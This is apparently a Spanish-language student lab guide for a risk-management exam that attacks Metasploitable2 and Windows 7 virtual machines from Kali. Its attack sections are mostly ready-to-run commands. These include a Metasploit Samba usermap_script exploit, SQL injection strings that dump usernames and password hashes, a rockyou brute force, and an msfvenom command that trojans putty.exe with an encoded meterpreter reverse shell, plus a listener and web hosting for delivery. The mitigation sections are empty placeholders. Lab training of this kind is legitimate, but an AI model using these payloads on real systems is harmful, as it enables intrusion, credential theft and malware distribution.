# Informe Prueba 3 Gestion de Riesgos
## Punto 1: Explotación a servicio
Maquinas Usadas en Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable](https://www.rapid7.com/products/metasploit/metasploitable/)

Ayuda
- NMAP
	- [vulnersCom/namp-vulners NSE nmap repo](https://github.com/vulnersCom/nmap-vulners)
	- [esecurityplanet - Nmap Vulnerability made easy](https://www.esecurityplanet.com/networks/nmap-vulnerability-scanning-made-easy/)
	- [Nmap Docs - NSE Usage](https://nmap.org/book/nse-usage.html)
- SMB
	- [Hackerhalt Medium - SMB Explotation](https://hackerhalt.medium.com/techniques-for-exploiting-smb-servers-64a369711ea6)
	- [HackingArticles - SMB Enumeration Guide](https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/)

### A. Footprinting al servicio SAMBA
Desde la maquina Kali a Metasploit
**Pasos Kali**
- Escaneo de puertos
	- `ping {ip-metasploitable}`
	- `nmap {ip-metasploitable} -sV`
	- `nmap {ip-metasploitable} -p445,139 -sV`
### B. Creacion de Exploit para samba
Desde la maquina Kali a Metasploit
- Crear exploit
	- `use exploit/multi/samba/usermap_script`
	- `show options`
	- `set RHOST {ip-metasploitable}`
	- `set RPORT 139`
	- `set LHOST {ip-kali}`
	- `set LPORT 4444`
	- `run`
- Metodo 2: Automatico
	- `smbmap -H {ip-metasploitable}`

### C. Explotacion del Servicio
Incluya la demostracion de la conexion remota donde aparezca el nombre del servidor y la version del SO
- `nmap --script smb-os-discovery {ip-metasploitable}`
- `smbclient -N -L //{ip-metasploitable}`
- `smbclient //{ip-metasploitable}/{vulnerable-folder}`
	- `srvinfo`
	- `enumdomains`
	- `querydominfo`
	- `netshareenumall`
	- `enumdomusers`

---

## Punto 2: Analisis de Vulnerabilidades
Con Nessus, realize un analisis de vulnerabilidades desde Kali Linux a Metasploitable y Win 7. Obtenga las evidencias con respecto a las vulnerabilidades criticas encontradas

Maquinas Usadas
- Kali Linux
- Metasploitable2
- Win 7

### 0. Instalacion de Nessus

> [!IMPORTANT] Importante
> Esta instalacion toma 1 hora en compilarse, cuidado con el tiempo

> [!WARNING] Peligro
> Puedes conseguir la licencia OFFLINE con la ayuda de la pagina de [nessus](https://plugins.nessus.org/v2/offline.php) y esta [guia](https://community.tenable.com/s/article/How-to-configure-a-new-install-of-Nessus-from-the-command-line) la cual usa `nessuscli` el cual esta en el directorio `/opt/nessus/sbin/`, no recomiendo este metodo.

> [!IMPORTANT] Importante
> Kali debes configurarlo con la maxima configuracion de CPU, RAM y Storage (SSD + I/O Anfitrion), ademas de habilitar ambos tick de paravirtualizacion ([Guia Aqui](https://stackoverflow.com/questions/54251855/virtualbox-enable-nested-vtx-amd-v-greyed-out)), de esta forma la compilacion se demorara menos.

Pasos
- `sudo su`: Ser root
- `setxkbmap -layout latam`
- `apt-get update && apt-get upgrade`
- Descargar [Nessus](https://www.tenable.com/downloads/nessus) (10.8.3) para "Linux - Ubuntu - AMD64" o con el link en curl desde el VM
```
curl --request GET --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.8.3-ubuntu1604_amd64.deb' --output 'Nessus-10.8.3-ubuntu1604_amd64.deb'
```
- Consigue una licencia gratuita por iniciar sesion para [Nessus Essentials](https://www.tenable.com/products/nessus/nessus-essentials) , necesitas tu correo institucional debido a que es dirigido a la [educacion](https://www.tenable.com/tenable-for-education)
- `dpkg -i {nessus.deb}`: Instala nessus
- `systemctl enable --now nessusd`: Inicia Nessus, incluyendo despues de reiniciar la maquina
- Conectarse a la ip `https://kali:8384` para ver la interfaz de nessus
- Presiona `Continue` SIN DARLE EL TICK EN "register offline"
- Presiona `Register for Nessus Essentials` y dale en `Continue`
- Rellena `First Name`, `Last Name` y `Email` con un correo institucional, si te inscribiste de la pagina web y te llego un correo con un codigo de activacion, dale en "`Skip`" (Si falla el registro tambien dale en skip)
- Luego escibe tu clave de activacion ONLINE, que te llego al correo al iniciar sesion en Nessus
- Crea un usuario `admin` o `kali` con alguna contraseña segura y presiona en "Submit"
- Se empezara a compilar los plugins, es el paso final de la instalacion, se demora aproximadamente 45 minutos en completar (Incluso con una instalacion optimizada)
- Luego que se compilen los plugins, se instalar, esto toma 5 minutos, saldra un mensaje de "Finalizo la instalacion de plugins" y podras analizar hasta 16 IPs de forma gratuita

### a. Descripción de la vulnerabilidad.
Desde Kali con Nessus, Analize las ip de la maquina Metasploitable y Windows 7 y anota alguna algunas de sus vulnerabilidades usando [CVE](https://www.cve.org/), [CVSS](https://www.cvedetails.com/) o [EPSS](https://www.first.org/epss/) o otra informacion importante

Descripcion Vulnerabilidad Metasploitable
- Info
Descripcion Vulnerabilidad Win 7
- Info

### b. Método de mitigación
Mitigacion Vulnerabilidad Metasploitable
- Info
Mitigacion Vulnerabilidad Windows 7
- Info

---
## Punto 3: Explotacion "SQL Injection" forma manual
Desde Kali Linux a Metasploit
Maquinas usadas en Red NAT
- [Kali](https://www.kali.org/)
- [Metasploitable2](https://www.rapid7.com/products/metasploit/metasploitable/) | Recomiendo que tenga DVWA (Acceder a la `{ip-metasploit}` a travez del navegador en kali)
Paginas de ayuda
- [Linux Console - SQL Injection](https://es.linux-console.net/?p=12889)
- [Metasploit SQL Injection](https://fwhibbit.es/guia-metasploitable-2-parte-2)
- [DVWA SQL Injection](https://medium.com/@aayushtiruwa120/dvwa-sql-injection-91b4efb683e4)
- [NoobLinux - Explain DVWA SQL Using Example](https://nooblinux.com/sql-injection-exploitation-explanation-examples-using-dvwa/)
- [Backtrack Academy - SQL Examples](https://backtrackacademy.com/articulo/sqlmap-ejemplo-con-metasploitable2)

> [!NOTE]- Nota
> A pesar de que el punto diga "**explotación de SQL Injection en forma manual**", se pueden usar herramientas automaticas como [Metasploit Framework](https://www.kali.org/tools/metasploit-framework/) o [sqlmap](https://github.com/sqlmapproject/sqlmap).

### a. Reconocimiento Base de Datos
- Iniciar Base de Datos
	- `sudo su`
	- `setxkbmap -layout latam`
	- `service postgresql start`
	- `msfdb init`
	- `msfconsole`
- Reconocimiento de MySQL (Puerto defecto 3306)
	- `db_nmap -sV -sC -p 3306 {ip-metasploitable}`
- FORMA MANUAL
	- `test' OR 1=1#`

### a. El listado de usuarios de la base de datos.
- Enumeracion Cuentas MySQL
	- `use auxiliary/admin/mysql/mysql_enum`
	- `set password ""`
	- `set username root`
	- `set rhosts {ip-metasploitable}`
	- `run`

### b. El nombre de la base de datos.
- Encontrar version de MySQL en uso
	- `search type:auxiliary mysql`
	- `use auxiliary/scanner/mysql/mysql_version`
	- `show options`
	- `set rhosts {ip-metasploitable}`
	- `run`
- FORMA MANUAL
	- `test' union select null, database() #`

### c. El hash de la contraseña de los usuarios de la base de datos.
- Fuerza Bruta para cuenta root
	- `use auxiliary/scanner/mysql/mysql_login`
	- `show options`
	- `set PASS_FILE /usr/share/wordlistss/rockyou.txt`
	- `set RHOSTS {ip-metasploitable}`
	- `set BLANK_PASSWORDS true`
	- `run`
- Explotacion MySQL archivo `/etc/password`
	- `use auxiliary/admin/mysql/mysql_sql`
	- `set username root`
	- `set password ""`
	- `set rhosts {ip-metasploitable}`
	- `set sql select load_file(\"/etc/password\")`
	- `run`
- FORMA MANUAL
	- `test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`

---

## Punto 4: Instalacion ESET Sysinspector 
Analisis en Windows 7 sobre malware
Maquinas usadas en Red NAT
- [Kali](https://www.kali.org/)
- Win 7
Herramientas
- [Putty](https://tartarus.org/~simon/putty-snapshots/w32/): Link a la version x86 32 Bits, debes descargar `putty.exe`
	- Usando wget: `wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe`
- [ESET SysInspector](https://www.eset.com/ni/soporte/diagnostico-de-pc-gratuito/)
Ayuda
- [Offsec Blog- Backdooring Exe Files](https://www.offsec.com/metasploit-unleashed/backdooring-exe-files/) 
- [Metasploit Docs - How to use a Reverse Shell](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html)
- [Medium Blog - Create Reverse Shell](https://medium.com/@jbtechmaven/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88)

### a. Genere un malware 
Usando la herramienta msfvenom en su servidor Kali y cópielo a su máquina Windows 7.
- Crea el virus principal
	- `sudo su`
	- `setxkbmap -layout latam`
	- `msfconsole`
> Recuerda modificar los parametros {ip-kali} por la ip de tu maquina
```
msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost={ip-kali} lport=4444 -e x86/shikata_ga_nai -i 10 -b "\x00" -f exe -o putty32virus.exe
```
- Abre una consola extra
	- `msfconsole`
	- `use exploit/multi/handler`
	- `set PAYLOAD windows/meterpreter/reverse_tcp`
	- `set LHOST {ip-kali}`
	- `set LPORT 4444`
	- `exploit`
- Instala Servidor Web
	- Instala servidor apache con `apt-get install apache2`
	- Activa servidor con `systemctl start apache2`
	- Mueve el archivo `putty32virus.exe` a `/var/www/html`
	- Si no funciona elimina el archivo `/var/www/html/index.html`

### b. Ejecute el malware en su máquina Windows 7 y capture lo siguiente:
 Abre tu maquina Win 7 (Recuerda tener abajo el antivirus y el Firewall)
- Instala `ESET Sysinspector` y Ejecutalo
- Abre la IP de Kali en el navegador
- Descarga y ejecuta el archivo
#### b.1 Los procesos generados por el malware.
- Ejecuta el modo `Log Sensible` de Sysinspector y ve a "Procesos"
#### b.2 Las conexiones de red generadas por el malware
- Ejecuta el modo `Log Sensible` de Sysinspector y ve a "Network"

---

Punto 5: CANCELADO POR MI, No se puede hacer debido a lo viejo que es MBSA, dejo de recibir soporte en 2012

Pregunta 5: Utilizando su servidor Windows 2016, instale la aplicación MBSA y responda lo siguiente:

a. Obtenga un listado de las vulnerabilidades encontradas.

b. Seleccione una vulnerabilidad de riesgo alto y responda: Descripción de la vulnerabilidad y Método de Mitigación